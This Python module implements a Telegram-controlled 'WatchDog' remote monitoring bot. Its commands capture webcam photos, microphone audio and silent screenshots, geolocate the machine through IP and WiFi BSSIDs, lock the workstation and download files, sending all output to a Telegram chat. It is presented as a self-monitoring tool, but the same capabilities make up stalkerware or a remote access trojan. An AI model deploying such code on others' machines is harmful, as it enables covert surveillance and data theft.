# services/telegram_polling.py
import os
import threading
import time
import requests
from api.telegram_client import TelegramClient
from logs.logger import logger
from modules.camera import CameraModule
from modules.audio import AudioModule
from modules.screenshot import ScreenshotModule
from modules.locking import LockingModule
from modules.locate import LocateModule
from modules.system_stats import SystemStatsModule
from modules.file_manager import FileManagerModule
from modules.speech import SpeechModule

class TelegramPollingService:
    def __init__(self, telegram_client, app_config, captures_dir):
        self.client = telegram_client
        self.config = app_config
        self.captures_dir = captures_dir
        self.chat_id = str(app_config.telegram.chat_id)
        
        # Instantiate modules
        self.camera_mod = CameraModule(device_index=app_config.camera.device_index)
        self.audio_mod = AudioModule()
        self.screenshot_mod = ScreenshotModule()
        self.locking_mod = LockingModule()
        self.locate_mod = LocateModule()
        self.stats_mod = SystemStatsModule()
        self.file_mod = FileManagerModule()
        self.speech_mod = SpeechModule()

    def set_menu_commands(self):
        """Sets the command list in Telegram dynamically."""
        url = f"https://api.telegram.org/bot{self.client.bot_token}/setMyCommands"
        commands = [
            {"command": "ping", "description": "Check if system is online"},
            {"command": "capture", "description": "Take camera snapshot"},
            {"command": "listen", "description": "Record microphone audio"},
            {"command": "screen", "description": "Capture screen snapshot"},
            {"command": "locate", "description": "Get IP & WiFi triangulation location"},
            {"command": "stat", "description": "Fetch system stats (CPU, RAM, Battery)"},
            {"command": "lock", "description": "Lock Windows Workstation"},
            {"command": "ls", "description": "List sandboxed files"},
            {"command": "cd", "description": "Change sandboxed working directory"},
            {"command": "download", "description": "Download a file from sandbox"},
            {"command": "msg", "description": "Show pop-up message and speak it"},
            {"command": "help", "description": "View command help guide"}
        ]
        try:
            resp = requests.post(url, json={"commands": commands}, timeout=10)
            if resp.status_code == 200:
                logger.info("Telegram menu commands updated successfully.")
            else:
                logger.warning(f"Telegram setMyCommands failed: HTTP {resp.status_code}")
        except Exception as e:
            logger.error(f"Failed to set Telegram menu commands: {e}")

    def execute_command(self, command_text):
        """Parses and executes Telegram commands in a separate thread."""
        try:
            cmd = command_text.strip().split()
            if not cmd:
                return

            action = cmd[0].lower()
            logger.info(f"Telegram Commander: Received command '{action}'")

            if action == "/ping":
                self.client.send_message("🏓 Pong! WatchDog is active and listening.")

            elif action == "/capture":
                self.client.send_message("📸 Capturing photo...")
                filepath = self.camera_mod.execute(self.captures_dir, prefix="cmd_")
                if filepath:
                    self.client.send_photo(filepath, "📸 Remote webcam capture")
                    try:
                        os.remove(filepath)
                    except Exception:
                        pass
                else:
                    self.client.send_message("❌ Camera unavailable or failed to initialize.")

            elif action == "/screen":
                self.client.send_message("🖥️ Capturing screenshot...")
                filepath = self.screenshot_mod.execute(self.captures_dir)
                if filepath:
                    self.client.send_photo(filepath, "🖥️ Remote desktop screenshot")
                    try:
                        os.remove(filepath)
                    except Exception:
                        pass
                else:
                    self.client.send_message("❌ Screenshot failed to capture.")

            elif action == "/lock":
                self.client.send_message("🔒 Locking workstation...")
                if self.locking_mod.execute():
                    self.client.send_message("✅ Workstation locked successfully.")
                else:
                    self.client.send_message("❌ Failed to lock workstation.")

            elif action == "/msg":
                message = " ".join(cmd[1:])
                if message:
                    self.client.send_message(f"📢 Displaying alert: '{message}'")
                    self.speech_mod.execute(message)
                else:
                    self.client.send_message("⚠️ Usage: /msg [alert message text]")

            elif action == "/locate":
                self.client.send_message("📡 Scanning wireless spectrum & geolocating...")
                def run_locate():
                    data = self.locate_mod.execute()
                    # Parse WiFi report
                    wifi_list = []
                    for net in data.get("wifi", []):
                        wifi_list.append(f"📶 {net['ssid']} ({net['signal']})\n   `{net['bssid']}`")
                    
                    wifi_report = "\n".join(wifi_list[:8]) if wifi_list else "No WiFi networks found."
                    
                    geo = data.get("geo")
                    if geo:
                        map_link = f"https://maps.google.com/?q={geo['lat']},{geo['lon']}"
                        msg = (f"📍 *Detailed Location Report*\n"
                               f"--------------------------------\n"
                               f"🌍 *IP-Based Info*:\n"
                               f"   City: {geo['city']}\n"
                               f"   ISP: {geo['isp']}\n"
                               f"   IP: {geo['query']}\n"
                               f"   🔗 [Google Maps]({map_link})\n\n"
                               f"📡 *Nearby WiFi (Triangulation Data)*:\n"
                               f"{wifi_report}\n\n"
                               f"_Copy BSSIDs to Wigle.net for precise coordinate mapping_")
                        self.client.send_message(msg)
                    else:
                        self.client.send_message(f"❌ Geolocation failed. WiFi network scans:\n{wifi_report[:200]}")
                threading.Thread(target=run_locate, daemon=True).start()

            elif action in ["/stat", "/stats"]:
                self.client.send_message("📊 Analyzing system statistics...")
                def run_stats():
                    s = self.stats_mod.execute()
                    batt_status = "N/A"
                    if s["battery_percent"] is not None:
                        plugged = "🔌 Plugged In" if s["battery_plugged"] else "🔋 On Battery"
                        batt_status = f"{s['battery_percent']}% ({plugged})"
                    
                    msg = (
                        f"📊 *System Statistics*\n"
                        f"------------------------\n"
                        f"💻 *System*: {s['os']}\n"
                        f"🧠 *CPU*: {s['cpu_usage']}% (Freq: {s['cpu_freq']})\n"
                        f"💾 *RAM*: {s['ram_used_gb']}GB / {s['ram_total_gb']}GB ({s['ram_percent']}%)\n"
                        f"💿 *Disk (C:)*: {s['disk_free_gb']}GB free / {s['disk_total_gb']}GB\n"
                        f"⚡ *Battery*: {batt_status}\n"
                        f"⏱️ *Boot Time*: {s['boot_time']}"
                    )
                    self.client.send_message(msg)
                threading.Thread(target=run_stats, daemon=True).start()

            elif action == "/listen":
                duration = 5
                if len(cmd) > 1 and cmd[1].isdigit():
                    duration = int(cmd[1])
                    if duration > 30: 
                        duration = 30  # Limit to 30s
                
                self.client.send_message(f"🎤 Recording {duration}s of audio...")
                def run_listen(d):
                    filepath = self.audio_mod.execute(self.captures_dir, duration=d, prefix="cmd_")
                    if filepath:
                        self.client.send_audio(filepath, caption="🎤 Remote audio recording")
                        try:
                            os.remove(filepath)
                        except Exception:
                            pass
                    else:
                        self.client.send_message("❌ Audio recording failed (microphone unavailable or disabled).")
                threading.Thread(target=run_listen, args=(duration,), daemon=True).start()

            elif action == "/ls":
                target = " ".join(cmd[1:]) if len(cmd) > 1 else "."
                reply = self.file_mod.execute("ls", target)
                self.client.send_message(reply)

            elif action == "/cd":
                target = " ".join(cmd[1:])
                reply = self.file_mod.execute("cd", target)
                self.client.send_message(reply)

            elif action == "/download":
                target = " ".join(cmd[1:])
                if not target:
                    self.client.send_message("⚠️ Usage: /download [relative_or_absolute_file_path]")
                    return
                    
                filepath = self.file_mod.execute("download", target)
                if filepath:
                    self.client.send_message(f"⬇️ Uploading file '{os.path.basename(filepath)}'...")
                    self.client.send_document(filepath)
                else:
                    self.client.send_message("❌ Access Denied: File resides outside sandbox or does not exist.")

            elif action == "/help":
                help_text = (
                    "🛡️ *WatchDog Command Center*\n\n"
                    "• /ping - Check system status\n"
                    "• /capture - Capture webcam snapshot\n"
                    "• /listen [sec] - Record mic audio (max 30s)\n"
                    "• /screen - Take silent desktop screenshot\n"
                    "• /stat - Fetch system CPU/RAM metrics\n"
                    "• /locate - Triangulate geolocation\n"
                    "• /lock - Force workstation lock\n"
                    "• /ls [path] - List files in sandbox\n"
                    "• /cd [path] - Change working folder\n"
                    "• /download [path] - Download file\n"
                    "• /msg [text] - Popup warning and speak it\n"
                    "• /help - View help commands list"
                )
                self.client.send_message(help_text)

        except Exception as e:
            logger.error(f"Telegram Commander: Command execution exception: {e}")

    def start(self, stop_event):
        """Starts the update polling loop. Blocks until stop_event is set."""
        logger.info("Telegram Polling Service Started.")
        
        # Refresh Telegram menu options
        self.set_menu_commands()
        
        offset = 0
        session = requests.Session()
        
        while not stop_event.is_set():
            try:
                url = f"{self.client.base_url}/getUpdates"
                params = {
                    "offset": offset,
                    "timeout": 30  # Wait up to 30 seconds for long polling
                }
                
                resp = session.get(url, params=params, timeout=40)
                if resp.status_code != 200:
                    logger.error(f"getUpdates HTTP error: {resp.status_code}")
                    time.sleep(5)
                    continue

                result = resp.json()
                if result.get("ok"):
                    for update in result.get("result", []):
                        offset = update["update_id"] + 1
                        
                        if "message" in update:
                            message = update["message"]
                            user_id = str(message.get("from", {}).get("id"))
                            text = message.get("text", "")
                            
                            # Strict authorization check
                            if user_id == self.chat_id and text.startswith("/"):
                                threading.Thread(
                                    target=self.execute_command, 
                                    args=(text,), 
                                    daemon=True
                                ).start()
                                
            except Exception as e:
                logger.error(f"Telegram polling loop exception: {e}")
                time.sleep(5)
                
            time.sleep(0.5)
